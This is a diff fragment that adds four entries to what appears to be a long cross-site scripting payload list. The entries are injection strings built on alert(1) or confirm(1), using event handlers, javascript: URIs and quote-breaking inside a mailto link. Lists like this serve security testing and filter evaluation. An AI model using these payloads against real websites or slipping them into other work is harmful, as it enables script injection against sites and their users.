@@ -1161,3 +1161,7 @@ xss--><!--<script>xss
 x”</title><img src%3dx onerror%3dconfirm(1)>
 <%/z=%&gt&lt;p/&#111;nresize&#x3d;alert(1)//>
 <%/z=%&gt&lt;p/onresize=alert(1)//>
+<a href="mailto:test-01-%27-alert(1)-%27-test@test.com">test</a>
+<a href="javascript:_e({}, 'cvml', 'test-01-%27-alert(1)-%27');" target="_blank">test</a>
+javascript:_e({}, 'cvml', 'test-01-'-alert(1)-'');
+<p onbeforescriptexecute="alert(1)"><svg><script>\</p>
